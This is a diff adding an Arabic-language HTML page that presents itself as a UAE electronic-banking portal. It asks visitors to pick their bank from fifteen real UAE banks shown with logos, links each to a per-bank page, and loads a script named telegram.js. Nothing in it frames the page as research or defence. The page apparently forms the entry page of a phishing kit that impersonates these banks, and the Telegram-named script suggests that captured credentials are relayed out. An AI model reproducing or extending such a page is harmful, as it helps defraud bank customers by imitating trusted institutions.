@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات البنوك الإماراتية</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        body {
+            background-color: #1a3a5c;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .bank-page-header {
+            background-color: #1a3a5c;
+            padding: 30px;
+            text-align: center;
+        }
+        .bank-page-header img {
+            height: 80px;
+        }
+        .bank-page-title {
+            color: #006633;
+            font-size: 36px;
+            text-align: center;
+            margin: 30px 0 15px;
+            background-color: #fff;
+            padding: 20px;
+        }
+        .bank-page-subtitle {
+            color: #666;
+            text-align: center;
+            font-size: 18px;
+            background-color: #fff;
+            padding: 0 20px 30px;
+        }
+        .banks-container {
+            background-color: #1a3a5c;
+            padding: 30px;
+        }
+        .banks-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .bank-card {
+            background-color: #fff;
+            border: 3px solid #f5a623;
+            border-radius: 10px;
+            padding: 25px 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: block;
+        }
+        .bank-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border-color: #006633;
+        }
+        .bank-card img {
+            height: 50px;
+            max-width: 150px;
+            object-fit: contain;
+            margin-bottom: 15px;
+        }
+        .bank-card h3 {
+            color: #333;
+            font-size: 16px;
+            margin: 0;
+            font-weight: 500;
+        }
+        @media (max-width: 600px) {
+            .banks-grid {
+                grid-template-columns: 1fr;
+            }
+            .bank-page-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bank-page-header">
+        <img src="images/uae_logo.png" alt="شعار الإمارات">
+    </div>
+    
+    <h1 class="bank-page-title">الخدمات المصرفية الإلكترونية</h1>
+    <p class="bank-page-subtitle">الرجاء اختيار البنك الخاص بك للمتابعة</p>
+    
+    <div class="banks-container">
+        <div class="banks-grid">
+            <a href="banks/1.html" class="bank-card">
+                <img src="images/adib_logo.png" alt="مصرف أبوظبي الإسلامي">
+                <h3>مصرف أبوظبي الإسلامي</h3>
+            </a>
+            
+            <a href="banks/2.html" class="bank-card">
+                <img src="images/ajman_bank_logo.png" alt="مصرف عجمان">
+                <h3>مصرف عجمان</h3>
+            </a>
+            
+            <a href="banks/3.html" class="bank-card">
+                <img src="images/dubai_islamic_bank_logo.png" alt="بنك دبي الإسلامي">
+                <h3>بنك دبي الإسلامي</h3>
+            </a>
+            
+            <a href="banks/4.html" class="bank-card">
+                <img src="images/mashreq_bank_logo.png" alt="بنك المشرق">
+                <h3>بنك المشرق</h3>
+            </a>
+            
+            <a href="banks/5.html" class="bank-card">
+                <img src="images/sharjah_islamic_bank_logo.png" alt="مصرف الشارقة الإسلامي">
+                <h3>مصرف الشارقة الإسلامي</h3>
+            </a>
+            
+            <a href="banks/6.html" class="bank-card">
+                <img src="images/fab_bank_logo.png" alt="بنك أبوظبي الأول">
+                <h3>بنك أبوظبي الأول</h3>
+            </a>
+            
+            <a href="banks/7.html" class="bank-card">
+                <img src="images/hsbc_bank_logo.png" alt="بنك HSBC">
+                <h3>بنك HSBC</h3>
+            </a>
+            
+            <a href="banks/8.html" class="bank-card">
+                <img src="images/adcb_bank_logo.png" alt="بنك أبوظبي التجاري">
+                <h3>بنك أبوظبي التجاري</h3>
+            </a>
+            
+            <a href="banks/9.html" class="bank-card">
+                <img src="images/rakbank_logo.png" alt="بنك رأس الخيمة الوطني">
+                <h3>بنك رأس الخيمة الوطني</h3>
+            </a>
+            
+            <a href="banks/10.html" class="bank-card">
+                <img src="images/cbi_bank_logo.png" alt="البنك التجاري الدولي">
+                <h3>البنك التجاري الدولي</h3>
+            </a>
+            
+            <a href="banks/11.html" class="bank-card">
+                <img src="images/nbf_bank_logo.png" alt="بنك الفجيرة الوطني">
+                <h3>بنك الفجيرة الوطني</h3>
+            </a>
+            
+            <a href="banks/12.html" class="bank-card">
+                <img src="images/emirates_islamic_bank_logo.png" alt="الإمارات الإسلامي">
+                <h3>الإمارات الإسلامي</h3>
+            </a>
+            
+            <a href="banks/13.html" class="bank-card">
+                <img src="images/nbd_bank_logo.png" alt="بنك الإمارات دبي الوطني">
+                <h3>بنك الإمارات دبي الوطني</h3>
+            </a>
+            
+            <a href="banks/14.html" class="bank-card">
+                <img src="images/commercial_bank_of_dubai_logo.png" alt="بنك دبي التجاري">
+                <h3>بنك دبي التجاري</h3>
+            </a>
+            
+            <a href="banks/15.html" class="bank-card">
+                <img src="images/liv_bank_logo.png" alt="بنك LIV">
+                <h3>بنك LIV</h3>
+            </a>
+        </div>
+    </div>
+    
+    <script src="js/telegram.js"></script>
+</body>
+</html>
